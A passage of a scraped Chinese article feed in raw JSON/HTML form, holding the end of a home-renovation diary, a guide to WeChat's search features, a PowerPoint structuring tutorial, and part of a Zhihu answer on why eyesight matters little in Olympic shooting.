月中旬才进场。然后卫浴也安装完成。装完之后我们和监理师轮番去现场检查，发现有一些比较明显的缝隙需要填充。定制柜的部分好莱客专门派了工人上门打胶，顺便按我们的要求给柜体开孔（如洗衣机的排水孔和接线孔等）。卫浴和其他地方我们自己买了玻璃胶等材料，工长派工人帮我们做了填缝，浴缸下面还帮我们打了白水泥。这些工作林林总总加起来，到 6 月初才基本完工。</p>\n<p>在此期间我们开始进行收尾和软装的工作，例如请美缝工人来做美缝。为了颜色和地砖匹配，我们选了比较贵的进口美缝剂，加上人工费总共 5400 元左右，比使用国产美缝剂贵出 1000 多块，但效果上是值得的。</p>\n<p>到以上为止的各种事项看起来都还顺利，但接下来整个 6 月就仿佛全程水逆。我们在安装灯具、空调、电器和燃气的过程中不断发现先前设计和施工中遗留下来的问题，开始和设计师、工长轮番斗智斗勇（简称撕逼）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/73efc0b56c3caa13a905493b7e8a4112.png\"><figcaption>客厅和厨房局部，注意空调旁边突起的白色部分（改造后的排水管）</figcaption></figure><p>第一个撕逼场景是空调安装。客厅的空调按照计划要装在吊顶上。空调的排水管是在做吊顶之前就预先埋好的。按照格力空调师傅说的安装规定，这根管必须使用 PVC 硬管，但不知为何吊顶里只埋了软管。软管的问题在于一旦在使用中出现变形，就可能导致水倒流回吊顶里，这个吊顶一边通定制柜，另一边通配电箱，后果可想而知。</p>\n<p>负责埋管的空调安装工与工长在这里互相推诿，谁都不愿意承担责任。工长甚至想劝说我们「一般不会出事，你们就这样装上空调凑合用如何」。我和 Doris 非常火大，提出「要不咱们直接拆光吊顶和柜体，全部返工」。工长最终才同意打开吊顶，重新铺设 PVC 硬管。问题到此算是解决了。</p>\n<p>这种事关安全的细节是绝对不能妥协的。一定要硬气。毕竟住在这里的可是你自己啊！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/89d68cee5c965c1b1b8b7af36b6624f7.png\"><figcaption>主卧的定制柜（注意左侧的 U 型墙）</figcaption></figure><p>第二个撕逼场景是灯具开关。电工装完灯具，我和 Doris 去现场试验，发现设计师的方案在实际操作中好几处都没有实现。例如，设计方案规定在卧室门口设置客厅的双控开关，这个功能不见了；客厅的主灯和餐桌灯本应是两个不同的开关控制，结果变成了一个开关。不少开关和插线板的外盖也装得歪歪扭扭。我们找电工提出质疑，结果电工摆出一副大爷的样子，大意是「我觉得你们这里不需要双控所以我就没做这根线」「我一年做几百家的工，你们这种需求和想法都是毫无价值的」「这里装歪了都是小事，有什么大不了」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/1de4a81c7ad497e4baa395f424ddde73.jpg\"></figure><p>是可忍孰不可忍。我们当即找工长和设计师告状，要求必须换掉电工，解决所有瑕疵和问题，否则宁可拆掉整个外墙重新回去做水电开槽和定位。最后的折中方案是安装遥控开关解决双控和缺失的控制功能，装歪的地方无条件返工，以及，不靠谱的电工大爷终于被请走。</p>\n<p>这种事关态度的细节也是绝对不能妥协的。一定要加倍硬气。设计师和工长既然接受了需求、签了合同，就必须兑现承诺。和稀泥、企图敷衍了事，都是完全不可以接受的。</p>\n<p>此外还有一些大大小小的问题，例如，某一根电路正好走在预定挂装油烟机的挂点位置上（一打孔就可能打到电线造成短路）。又例如，橱柜工人没有预留下水管的三通，装水槽时把冷水管当做热水管。再例如，水电工给洗衣机、洗碗机预留的水龙头的型号规格和我们的家电不匹配。等等。归结起来都是一句话，「做前一步工作的人不考虑后一步工作的需求」。……解决这些问题又花了一些额外的时间和心力。总的来说，业主天天到场督工应该能减少这类小节目出现的概率，但我们是不是有这么多时间，会额外增加多少成本，又是一件麻烦事。</p>\n<p>还好，最终，问题一个一个解决，该安装的设备一件一件装到位，我们最艰难的一段时期，也就这么过去了。</p>\n<p>然后就是开通网络、安装燃气、开荒保洁和安装窗帘（为了挑窗帘颜色我们甚至自己买了套 Pantone 色卡），以及，安排搬家（有关搬家服务如何选，我会另文专门谈）。最终，总算，小功告成！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/f7de9cad05f663a7fb774248e9ec9e5b.png\"></figure><h2>总结</h2>\n<p>在完成所有工作后，我和 Doris 算了一笔总账。付给本居的设计费，付给工长的辅材和工费，监理费，硬装阶段和软装阶段的各种采购，以及各种安装、开荒保洁和辅助物料（甚至包括吸味道的炭包），以上全部加起来大概花了 38 万人民币，折合每平方米 4300 多元。超支的部分主要由我和 Doris 对各种设备（如大冰箱、划船机）及一些装修材料的「额外需求」引起。不考虑这些额外需求的话，与本居设计给我们的预期管理大体相当。可以算是在预算允许的范围内尽可能地满足了我们所有的需求，有些地方甚至实现了一点小奢侈。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/513312e707390482b66c7e5f38b6ea1a.png\"><figcaption>我的工作台，以及门上的 TRX 固定点</figcaption></figure><p>强烈推荐（买了能显著增加幸福感）的东西：</p>\n<ul>\n<li>洗碗机：家里某些陈年的酒杯和茶杯手洗不出来，抱着试试看的态度丢进洗碗机，拿出来就仿佛船新。同时可以极大减轻「想到洗碗就不愿意在家做饭」的压力。</li>\n<li>烘干机：洗完就烘，烘完就可以收纳。基本免去晾晒和收衣物的烦恼。</li>\n<li>智能马桶（或马桶盖）：洗洗更健康，真·不是开玩笑。</li>\n<li>第二个洗面台：只要非独居就推荐，早晨不用为争夺厕所打架。</li>\n<li>第三方监理：尤其在前期强烈推荐，有些小问题如空鼓，业主就算全程监工也看不懂、无法觉察。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/1a6cff2de1a2252b197a75970a02f120.png\"><figcaption>投影仪和电动幕效果实测</figcaption></figure><p>见仁见智的选择（仅供参考，视需求而定）：</p>\n<ul>\n<li>划船机：全身运动 + 高效有氧运动，从此无需出门跑步。</li>\n<li>TRX：配合徒手动作和一张瑜伽垫，可以实现全身抗阻运动，通常无需健身房。</li>\n<li>洞洞板：收纳神器，同时逼格拉满。</li>\n<li>浴缸：在身心极度疲惫的时候，泡澡比暴饮暴食更有效也更健康。</li>\n<li>全屋净水器：如果对水质（特别是洗澡水）有更高要求，或者家里有小朋友和老人，应该考虑装一台。</li>\n<li>蒸烤箱：微波炉的全能放大升级版装备。</li>\n<li>投影仪和投影屏：现代人买了它甚至可以不再买电视。</li>\n</ul>\n<p>不推荐的东西（买了意义不大，性价比不高）：</p>\n<ul>\n<li>榻榻米 + 地柜：浪费空间，储物能力不强，而且很丑……</li>\n<li>垃圾粉碎机：只要管网系统还没改造，你买这货就是给所有人（尤其是自己）添堵。</li>\n<li>全屋吊顶：压缩层高，显得憋屈，而且里面容易积攒灰土。</li>\n</ul>\n<p>其他一些务必要注意的点：</p>\n<ul>\n<li>水电验收要请设计师在场，逐个核对电路是否实现设计需求，否则事后弥补和修改都很难。</li>\n<li>墙里要埋六类（甚至超六类）网线，除非你家只装 100MB 以下的宽带网。</li>\n<li>从设计阶段到试用，都要注意预留空间，例如，某个柜体一开门会碰到射灯，灯就必须调整方向或安装位置，否则越往后会越陷入 troubleshooting 的漩涡。</li>\n</ul>\n<p>以上。祝各位装修顺利，早日完成自己理想的新（gou）居（wo）。^_^</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/05db837827c45ab5bdb48488c943817c.png\"><figcaption>客厅全景，近处是折叠餐桌和划船机</figcaption></figure><hr>\n<p>本文由乔淼和 Doris 共同完成。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68017"},{"title":"你从未用过的微信「搜一搜」，其实可以很实用","date":"2021-08-04 08:00:00","description":"\n<p>尽管有不少人吐槽微信臃肿，功能更新缓慢，甚至还有不少人要教张小龙做产品，但不可否认的是，微信已经成为了如今我们生活中不可缺少的一个 App。其实，微信除了聊天、发朋友圈之外，还有不少我们所不在意的功能，例如这次要来细聊的「搜一搜」。</p>\n<p>「搜一搜」上线了这么久，肯定有不少人用它来搜过文章、朋友圈或聊天记录，但实际上「搜一搜」能做的远不止这些，它不仅是微信中的搜索入口，更是一个强大的聚合性服务，隐藏着不少值得好评的小功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/02/7f594c5811ea7a8b1844d9c5c38e2ffd.png\"></figure><h2>一键寄快递</h2>\n<p>提到寄快递，你是不是想到用 App、公众号、小程序？现在，只需要让对方在聊天框内直接给你发送地址电话和姓名，就可以一键寄快递了。</p>\n<p>长按地址，点击「搜一搜」，在弹出的页面中，就有一个来自微信快递服务的小卡片。如果格式正确，微信就能自动识别出地址、收寄件人和电话等信息，并显示「去寄件」按钮；如果格式缺少或微信无法识别正确地址，点击「去补充信息」，就可以进入到地址编辑界面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/fed22d97923c4bce0562ac84d86053ce.png\"></figure><p>进入到寄件的页面后，填写对应的信息，就可以安排快递寄件。在微信提供的快递公司中，涵盖了京东、三通一达、百世、EMS 等，算是比较丰富，不过没有顺丰的加入还是稍显遗憾。接着剩下的流程就和正常的寄件一致，填写支付方式、物品信息和备注即可。值得注意的是，目前微信快递服务暂不支持预约取件时间，需要等待后续支持。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/f3529d322a43d38f0f458893fa7a9785.png\"></figure><p>除了寄件之外，微信快递服务还支持查快递、快递待取件通知和签收通知。其中，快递相关的通知都将会通过微信的服务通知进行推送，不占用聊天列表。</p>\n<p>虽然从目前已接入的快递公司来看，微信快递服务还不足以让「干掉」其他快递聚合类应用，但微信也表示，更多合作快递公司正在积极接入中，也确实是件让人值得期待的事情。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/1a020829d4b894639f9a9184927632b3.png\"></figure><h2>搜音乐、剪视频</h2>\n<p>借助 QQ 音乐海量的资源，微信搜一搜还打通了音乐的搜索。在微信首页点击搜索，再点击「音乐」，或是直接长按带有歌曲内容的文本点击搜一搜，就可以进行音乐搜索。点击其中搜索结果列表中的歌曲，便会直接进入播放界面，并调用微信最近更新的功能，观看与音乐相关的短视频、查看歌词等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/107daffc80102c0dc721b19667d9d1c1.PNG\"></figure><p>点击下方的分享按钮，你还可以将这首歌设置为微信状态。而点击「创作音乐视频」你还会来到一个让人直呼「卧槽」的功能 —— 没错，你甚至可以在微信里剪视频。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/7ebcb5d3cb609da17a6e49dcabbf216d.PNG\"></figure><p>在音乐上，微信这个视频编辑器不仅可以自由截取歌曲片段制作，还可以自动根据音乐节奏，识别出一些精彩片段来进行制作；而在视频内容上，除了你自己的相册之外，还可以挑选你喜欢的视频号内容来进行二次剪辑。</p>\n<p>挑选好素材之后，就可以进入到剪辑界面。微信提供了一些基础的剪辑功能，可以方便对素材进行调整。剪辑完成后，便可以一键发布到自己的视频号。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/b0448e6841d0160185d5155f00d03dfb.PNG\"></figure><p>哦对了，除了这些之外，微信还打通了全民 K 歌。这也就意味着，你还可以搜索到全民 K 歌中的伴奏，和朋友或是自己一键 K 歌。</p>\n<h2>聚合服务中心</h2>\n<p>在微信首页点击搜索的界面后，点击下面的服务，我们就可以进入到聚合服务中心。在这里，绝大部分的搜一搜提供的服务都能找到，例如健康码、乘车码、公共服务等，点击即可进入相关的页面。</p>\n<p>另外值得表扬的是，微信都为这些服务定制了专属的聚合页面（行程卡除外），点击进入之后，就可以快速跳转到对应的功能页面，不少类型如社保、新冠疫苗接种和生活缴费等，还支持地区选择。更方便的是，这些已经接入微信的服务可以直接使用微信相关的身份信息，因此大部分情况下也不再需要注册账户的操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/d34a4ec0f90ce39cec2e812a4b3fcc58.PNG\"></figure><p>由于功能繁多，这里我将挑选几个让我印象比较深刻的功能进行介绍。</p>\n<h3>微信挂号服务</h3>\n<p>由于目前不少医院已经全面采用线上挂号预约制，取消了窗口挂号，因此微信提供的这个医院挂号功能，除了方便我们自己使用外，我认为最大的好处是方便了父母长辈。我曾经在南方医院看到过两位老人，一位老人是患者，坐着轮椅，另一位拿着一台老旧的安卓手机，在前台咨询处，着急地询问着服务人员，怎样用微信的扫码功能挂号。</p>\n<p>而微信挂号服务无需扫码，无需太复杂的点击，只需要点一下搜索框，进入服务界面，点击挂号就可以立刻开始。进入挂号界面后，微信还会根据定位远近对医院进行列表，同时还可以选择地区和医院等级。点击医院右侧的「挂号」按钮，选择官方的渠道，就可以直接跳转到对应医院的挂号界面。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/a0fd5ee58b889c6d3b35a388aedc6bc0.PNG\"></figure><p>同时借助微信的通知系统，挂号和就诊的相关消息，都可以直接推送到服务通知，避免遗漏。</p>\n<h3>时事热点定制服务</h3>\n<p>在公共服务下方，是「热门搜索」的卡片，在这里微信搜一搜会提供近期时事热点所需要的服务，例如前段时间的河南水灾求助入口，以及近段时间大家可能热点关注的出行政策查询、疫情风险等级等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/681e24a25b9a81faaa911d175d38dfc5.jpg\"></figure><p>值得一提的是，这些页面内有一些是微信直接提供服务，有一些则是直接列出提供服务的官方公众号、小程序。但无论是哪一种，我目前都没有遇到有竞价广告推荐（进入到某些第三方服务商提供的可能会有开屏广告），基本上接入的都是国家政府、事业单位提供的接口。在如今广告无孔不入的时代，一个找不到广告的服务页面，也算是十分良心的了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/ccc078e61f751cc7b9c03247dc283ec0.PNG\"></figure><h3>搜图片、搜文字、搜表情包</h3>\n<p>除了提供上面的服务之外，搜一搜还可以对微信中几乎所有的图片、文字内容进行搜索。不管是在朋友圈、文章还是聊天内容中，都可以长按选中对应的内容进行搜索。</p>\n<p>例如，当我们收到朋友发来的一张图片时，可以直接长按图片，或是在查看图片界面的右下角直接点击搜一搜按钮，微信便可以对图片进行搜索。而一些有人脸的照片，还可以匹配他们的长相或相似的明星，甚至微信官方还提供了一个「恶搞」的功能，直接为你生成动态表情包。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/952682b7afe131f9f2350a474d401898.PNG\"></figure><p>当然，一些以图片形式发送的表情包，也可以用搜一搜功能，搜索出一些类似的表情包出来，然后一键转发给朋友，或是添加到自己的表情包库里。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/03/2e1e75922926d0b7f8eed06a3d934e69.PNG\"></figure><p>搜文字、搜表情包的功能这里就不细说了，操作的入口和方式都与前文类似。总之借助微信庞大的内容生态，能搜索出来的内容，或许还会给你不小的惊喜。</p>\n<p>不难看出，微信的搜一搜其实已经成为了打通整个微信内容生态的入口之一。曾经我们调侃微信想做一个「WeChat OS」，从现在来看，这个玩笑或许真的不是玩笑。至于这样做的目的和结果，我想就留给大家去评价吧。你还知道哪些搜一搜的功能？欢迎和我们分享。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68058"},{"title":"从页到金字塔结构——PPT 制作入门指南","date":"2021-08-04 06:36:18","description":"\n<h2>从金字塔结构转变为「页」</h2>\n<p>上一章节中，我们获得了可以作为整个 PPT 演示思路的金字塔结构。<strong>那么如何让金字塔结构转变为 PPT 呢？</strong>这一步可能是很多同学都很头疼的问题。在这个章节中，我们就重点围绕金字塔结构，探讨每一页 PPT 的诞生过程。</p>\n<p>首先，我们要将金字塔结构转化为 PPT 中对应的单元——「页」，页即我们平时在 PPT 中所见到的每一页，是我们制作 PPT 中的最小单元。</p>\n<p>对于「页」，我们需要提出一个基本的原则：</p>\n<blockquote><p>一页只能包含一个主要观点，同一个核心观点也可以由多个子页来解释和支撑。</p></blockquote>\n<p>每一页中，除了主要观点，还有就是支撑这个观点的「结论」。结论通常是文字、数据、图表等等既成事实所得出的结论。</p>\n<p>所以一页通常由「主要观点、信息结论、信息」构成。我们继续以 A 地的销售问题举例，在进行金字塔结构的思考时，我们会先自下而上，从事实依据进行思考，推导出我们的主要观点：</p>\n<blockquote>\n<p>信息：1. 与竞品的价格比较；2. 过往促销情况与销量增长的关系；3. 用户对于本品价格的看法。</p>\n<p>信息结论：1. 竞品价格稍低于本品；2. 促销没有触发爆发式的增长；3. 高定价带来品牌好感。</p>\n<p>主要观点：在售商品单价应保持不变。</p>\n</blockquote>\n<p>从事实到观点，是我们在思考过程中的「推演」过程，是「从分到总」的顺序。当我们需要转变为「页」的内容时，则需要将这个结构倒过来呈现，转变为「总分结构」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/27/article/8a2fc0128e7c099888f7a5b22a223ad8\"></figure><p>扭转金字塔呈现方式的原因，是因为我们<strong>希望观者能够快速明白我们想传达的信息</strong>。而观点的确立则通过下方的信息结论来进行佐证。</p>\n<p>我们曾在前文中提到，观看我们 PPT 的人有可能非常的忙，他们没有时间定下心来逐字逐句的阅读我们的 PPT，而是以速览的方式阅读。我自己的体会也是如此，在正式演示时，很少会有人在意 11 号以下的小字写了些什么东西，<strong>观者都习惯于从最大号的字体看起，迅速明白这一页的主要信息，就开始忙手上的其他事情。</strong></p>\n<p>所以一定要最快、最直接的办法把我们要传达的观点呈现出来。通过下图的模块化的结构形式，大家可以尝试将示例金字塔中的内容填入，这样一页的基础内容就完成了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/27/article/2e62b07087d8da7c5481762414e63fcd\"></figure><p>这就是一个最基础的「页」的单元中，将思考的金字塔，转变为以文字、元素搭建成的属于 PPT 演示的金字塔结构的示意。以这样的结构为例，我们陆续完成多个观点的内容即可。从一个复杂的论述题，拆解为一道道以「页」为单位的填空题。</p>\n<p>这个方法可以最快的呈现一个完整的 PPT 演示结构出来，以纯文字的方式，方便在这个阶段和我们的需求方进行结构内容的确认，有效的避免后续在结构上的反工。</p>\n<p>这个方法对开展后续的 PPT 编辑制作也提供了方便，把逻辑结构的整理单独出来思考。边设计编辑，边整理逻辑结构的做法非常危险，往往就会发生因为结构错误，导致设计编辑需要重做，又或者因为花了很多精力不愿意放弃这错的一页，导致整个PPT混乱。</p>\n<h2>PPT 「页」的种类</h2>\n<p>当然除了上面提到的这类以事实为基础的内容页，在金字塔结构中我们还有很多不同的「页」需要制作，它们又属于什么类型，怎么来制作呢？</p>\n<p>为了更顺畅地开始我们的 PPT 制作，我对「页」进行了种类上的区分，在后几章的内容中，我也将根据不同的「页」进行更加详细的解析和示范。</p>\n<h3>第一类：装饰页</h3>\n<p>装饰页顾名思义，他们很少承载我们要传达的信息，但是它们呈现了一个合适的沟通环境，暗示了演示者与观者已经达成了某种基础共识。这种共识可以简单地理解为：风格。商务风格、互联网扁平风格、与公司 VI 统一的视觉元素等等，还可以是结合期待所调整出的新的风格。通过视觉语言将观者带入一个已经初步认可的视觉环境。</p>\n<p>这里我们也可以反过来思考一个问题，很多时候我们迷失在模板网站的忙忙模板之中，为什么很难选出合适的模板？是不是因为没有一个合适的模板能够达成我们与需求方的基础共识，以至于当我们遇到具象的演示需求时，大众模板很难准确地传达我们想表达的信息？</p>\n<p>在具体的页面中，封面、封底、目录、章节页，它们都属于装饰页。装饰页通过颜色、样式，形成符合演示需求的环境。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/27/article/6d90d8772e5b2df07bf92aeb68b86693\"><figcaption>装饰页示意图，此类页往往很少承载重要信息，主要通过视觉风格将观者带入情境</figcaption></figure><h3>第二类：观点页</h3>\n<p>这一类在我看来，是整个演示最精彩的高潮部分。他们承载了我们最主要的观点，也是最需要观者记住，或者展开探讨的部分。</p>\n<p>主旨页、分观点页都属于这一类，是我们最需要花精力做的精彩的一部分。这类页的呈现上，更关注如何将我们浓缩后的观点，以逻辑的关系，强势的表达出来。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/27/article/0e38c2ee308e31d5cf9609c4bf5d5ccd\"><figcaption>观点页示意图，此类页适合快速提炼和展示核心论点，既可以用在演讲中，也可以放在阅读型 PPT 的靠前位置</figcaption></figure><h3>第三类：内容页</h3>\n<p>第三类内容也是我们最常制作的，即本节前半部分举例中提到的，以信息与观点相结合，展现我们的事实依据的页面。这一类的衍生和变化是最多的，简单举例来说，有数据页、以图片为主的内容页、以文字为主的内容页等等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/27/article/f4fd0774c9e1128b15e418242aa477a7\"><figcaption>内容页示意图，此类页面往往包含大量文字信息供观众阅读</figcaption></figure><p>其实很多品牌发布会的 PPT 都是行业的领先之作，有很多非常值得我们从中进行学习的地方。即使是从简单的模仿开始，也能对我们平时的 PPT 制作带来不一样的改变。在关注新品发布的同时，也可以关注一下他们背后的 PPT 是如何帮助他们进行新品发布的演示的。</p>\n<p>各类「页」的制作思考与方法，我们将在之后的章节里陆续解析。在此之前，我们将开始着手设置好我们的 PPT 软件，做最后的「开工准备」。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67962"},{"title":"奥运神射手许海峰视力不足 0.5，张梦圆近视 600 度，近视也可以练射击吗？他们是如何看清靶子的？","date":"2021-08-04 06:30:10","description":"\n<p>对于射击运动来说，<b>视力远没有多数人想象的那么重要</b>。</p>\n<p>普通人无法看清的靶纸，<b>很多射击运动员同样无法看清</b>。</p>\n<p><br></p>\n<p>因为一来靶纸那么小、距离那么远，已经超过人类视力的极限。最后的结果是，大家都看的不是很清……二来即便存在“千里眼”看得清清楚楚，如果无法做到动作稳定、且心态平静的完成射击，依然无法实现目标。</p>\n<p>毕竟射击向来比的不是谁看的最准，甚至不是比谁射击的技术，而是<b>比谁心理更沉着，动作更「稳」。</b></p>\n<p>——所以射击选手花了大量的时间，都用来训练抗压能力/心理负荷和稳定性。包括所有射击项目用到的道具，射击服、射击鞋等，主要的作用也都是提高稳定性、降低干扰。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c643d3516909f50d1d150d0d3f109ff5_720w.jpg?rss\" data-rawwidth=\"2070\" data-rawheight=\"1382\" data-size=\"normal\" data-caption=\"面部肌肉颤抖对气步枪射击而言是很要命的\" data-watermark=\"watermark\" data-original-src=\"v2-c643d3516909f50d1d150d0d3f109ff5\" data-watermark-src=\"v2-d22620a066be6bef3d56c20526e96c41\" data-private-watermark-src=\"v2-7912020596079aa8a2371c85c99c22ba\"></p>\n<p><br></p>\n<p>之前和射击队的聊过，其中两点记忆犹新。</p>\n<p>打气步枪射击的，别管平时表情多么搞怪面部动作丰富，射击时<b>控制面部肌肉颤抖的能力</b>相当重要（实际上很多身体的细微动作并不受主观控制，这是与生俱来的天赋）；</p>\n<p>另外别看射击运动员比赛中每个动作那么稳、甚至视觉上动作表现的很程序化很僵化，其实他们的身体动作非常柔和（笨重的射击服也限制了活动），射击运动员在所有奥运运动员里，可能具备最强的<b>姿势模仿能力</b>。</p>\n<p>这个姿势模仿能力，也是选拔潜力小射击运动员的重要标准之一。</p>\n<hr>\n<p>多放一些射击相关的设备和数据，对视力和射击这件事理解就能直观很多。</p>\n<p>也就能明白为什么说，<b>视力其实压根不是决定最终成绩的关键因素。</b></p>\n<p><br></p>\n<p>奥运射击分为两类，固定靶射击（气步枪、气手枪）和飞碟移动靶射击（双管霰弹枪）。固定靶射击里最短距离10米，固定射击位+固定靶纸。</p>\n<p>找了三张十米气步枪比赛的照片，注意距离十米远的靶纸上的黑点（很小）：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a61f8162d4b1bd096dc7942c67860ab5_720w.jpg?rss\" data-rawwidth=\"2068\" data-rawheight=\"1378\" data-size=\"normal\" data-caption=\"今年东京奥运会的十米气步枪\" data-watermark=\"watermark\" data-original-src=\"v2-a61f8162d4b1bd096dc7942c67860ab5\" data-watermark-src=\"v2-04076c7997de43b7adac7cb13d7977ca\" data-private-watermark-src=\"v2-7885c1609907d9fbbc2c27fa1da5f846\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-a4cb5aa17f6632d222c705317c8f7265_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1704\" data-size=\"normal\" data-caption=\"2016年里约奥运的十米气步枪\" data-watermark=\"watermark\" data-original-src=\"v2-a4cb5aa17f6632d222c705317c8f7265\" data-watermark-src=\"v2-3c02bed2538609bbf8e492d3681331c5\" data-private-watermark-src=\"v2-5f89e586b5334924063012f4185f2d8d\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9cac32d063d8374716ffab1c95267511_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1549\" data-size=\"normal\" data-caption=\"2000年悉尼奥运会的十米气步枪\" data-watermark=\"watermark\" data-original-src=\"v2-9cac32d063d8374716ffab1c95267511\" data-watermark-src=\"v2-8469af387e0691cf35d4df11e2d637b8\" data-private-watermark-src=\"v2-7c6c8ebe760527eea40a0e92334fe7a0\"></p>\n<p><br></p>\n<p>照片里几乎看不清的黑点，长这样：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-eaf94c752fa453778bc1987930996d2c_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"600\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-eaf94c752fa453778bc1987930996d2c\" data-watermark-src=\"v2-8a2619bc981a92ee5f9f28bf32242672\" data-private-watermark-src=\"v2-a679d212cca1a4df698389a272e42f22\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4175a56120392ec9877508723ef3af55_720w.jpg?rss\" data-rawwidth=\"1552\" data-rawheight=\"1076\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4175a56120392ec9877508723ef3af55\" data-watermark-src=\"v2-56b2fc38e9976aea65b0218e84a5226c\" data-private-watermark-src=\"v2-0256b89d60a6d5af0f2c05725943228c\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-40b7fe38af87ce013d3e0e91788901fa_720w.jpg?rss\" data-rawwidth=\"1286\" data-rawheight=\"316\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-40b7fe38af87ce013d3e0e91788901fa\" data-watermark-src=\"v2-cf37a8b562b4c4b203cbadafbb293093\" data-private-watermark-src=\"v2-6d8832082ddd19bedcbfd10c7c91d51e\"></p>\n<p>具体尺寸为：</p>\n<blockquote>总直径= 45.5mm； <br>4 环直径=30.5mm；<br>9 环直径=5.5mm； <br>10 环Ø=0.5mm；<br>划线宽度0.1mm至0.2mm</blockquote>\n<p><br></p>\n<p>就这么点大，且那么远。</p>\n<p><b>想要看清靶纸上的7～10环区，对人类的视觉而言几乎就已经是不可能的任务。</b></p>\n<p><b>而想靠眼睛去区分更细微的、能决定选手成绩的*.*环，更是完全天方夜谭。</b></p>\n<p>如果普通人有机会尝试一下10米气步枪射击，能打中靶纸，已经是相当不错的结果了。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-940b24ca888bd0b71925a8532d7c7a31_720w.jpg?rss\" data-rawwidth=\"1442\" data-rawheight=\"964\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-940b24ca888bd0b71925a8532d7c7a31\" data-watermark-src=\"v2-a0f9ebfc3f065605f3c0d5fa133b0cd0\" data-private-watermark-src=\"v2-63d079f33da8abcce3f15b691eec14ac\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2de532b30c98113a4747581ff6aad381_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"这张仅供参考尺寸\" data-watermark=\"watermark\" data-original-src=\"v2-2de532b30c98113a4747581ff6aad381\" data-watermark-src=\"v2-ebb5e1269be41afeba9df52198af1c70\" data-private-watermark-src=\"v2-ce53ad360730d4edb0d7eb7f783a7a40\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-12f29d42fea4a50e6ffa1eff3e3f24a6_720w.jpg?rss\" data-rawwidth=\"900\" data-rawheight=\"643\" data-size=\"normal\" data-caption=\"和奥运会使用的靶纸较为类似的装置。通过滚轴更换单次射击的靶纸。\" data-watermark=\"watermark\" data-original-src=\"v2-12f29d42fea4a50e6ffa1eff3e3f24a6\" data-watermark-src=\"v2-fcd2d8ae4234b037679cf38d7c50174c\" data-private-watermark-src=\"v2-0b8fbb17806fdc12eda7ffb7aef8f44b\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4c918094ff8d050c877ffcd3f5c60dd8_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"932\" data-size=\"normal\" data-caption=\"相比之下，气手枪的靶纸就要比气步枪大得多。二者在射击器材、射击方式的精准性和稳定性上也有明显的差异\" data-watermark=\"watermark\" data-original-src=\"v2-4c918094ff8d050c877ffcd3f5c60dd8\" data-watermark-src=\"v2-7414622bcfa55c90c2b069f95cfda240\" 